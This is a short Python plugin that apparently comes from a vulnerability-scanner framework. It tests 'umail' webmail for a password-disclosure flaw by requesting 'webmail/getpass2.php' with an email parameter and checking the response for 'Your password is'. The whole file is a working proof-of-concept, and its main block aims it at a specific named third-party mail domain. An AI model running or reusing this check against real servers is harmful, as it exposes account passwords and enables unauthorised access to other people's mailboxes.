#!/usr/bin/env python

def assign(service, arg):
    if service == "umail":
        return True, arg

def audit(arg):
    payload = "webmail/getpass2.php?email=1@qq .com&update=2"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "Your password is" in res:
        security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('umail', 'http://mail.wanduyiliao.com.cn/')[1])